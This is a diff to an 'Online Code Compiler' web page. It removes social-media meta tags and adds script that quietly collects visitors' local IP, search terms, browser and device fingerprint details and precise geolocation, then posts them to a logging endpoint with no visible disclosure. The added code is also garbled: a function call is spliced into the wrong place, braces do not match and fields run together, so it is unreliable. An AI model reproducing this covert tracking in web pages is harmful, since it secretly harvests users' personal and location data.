@@ -5,17 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Compiler Online</title>
     <link rel="stylesheet" href="style.css">
-
-    <meta property="og:title" content="Online Code Compiler">
-    <meta property="og:description" content="Write, compile, and execute code in various programming languages directly from your browser. Fast and easy!">
-    <meta property="og:image" content="https://raw.githubusercontent.com/KomaVR/Online-CodeBase/refs/heads/main/th%20(3).jpg">
-    <meta property="og:url" content="https://codersdatabase.vercel.app/">
-    <meta property="og:type" content="website">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Online Code Compiler">
-    <meta name="twitter:description" content="Write, compile, and execute code in various programming languages directly from your browser. Fast and easy!">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/KomaVR/Online-CodeBase/refs/heads/main/th%20(3).jpg">
 </head>
 <body>
     <h1>Compiler Online</h1>
@@ -66,15 +55,21 @@
                         const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
                         const timestamp = new Date().toISOString();
 
+                        // Get Geolocation
+                        let latitude = 'N/A';
+                        let longitude = 'N/A';
                         // Attempt to get geolocation (latitude and longitude)
                         let geoLocation = { latitude: 'N/A', longitude: 'N/A' };
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(position => {
+                                latitude = position.coords.latitude;
+                                longitude = position.coords.longitude;
                                 geoLocation = {
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude
                                 };
 
+                                logged = true;
                                 sendDataToServer(geoLocation);
                             }, error => {
                                 console.error("Geolocation error:", error);
@@ -85,9 +80,10 @@
                             sendDataToServer(geoLocation);
                         }
 
+                                // Send log data with location
+                                sendLogData({
                         function sendDataToServer(geoLocation) {
                             logged = true;
-
                             fetch('/api/log', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
@@ -115,6 +111,39 @@
                                     touchSupport,
                                     cookiesEnabled,
                                     plugins,
+                                    latitude,
+                                    longitude
+                                });
+                            });
+                        } else {
+                            logged = true;
+                            // Send log data without location
+                            sendLogData({
+                                ip: localIP,
+                                searchTerm,
+                                userAgent,
+                                referrer,
+                                currentURL,
+                                screenWidth,
+                                screenHeight,
+                                browserLanguage,
+                                timeZone,
+                                osInfo,
+                                timestamp,
+                                connectionType,
+                                browserVersion,
+                                deviceMemory,
+                                hardwareConcurrency,
+                                pixelRatio,
+                                onlineStatus,
+                                viewportWidth,
+                                viewportHeight,
+                                colorDepth,
+                                touchSupport,
+                                cookiesEnabled,
+                                plugins,
+                                latitude,
+                                longitude
                                     geoLocation
                                 })
                             }).then(response => {
@@ -130,6 +159,19 @@
             };
         }
 
+        function sendLogData(logData) {
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(logData)
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Failed to log information');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
         async function compileCode() {
             const code = document.getElementById('code').value;
 
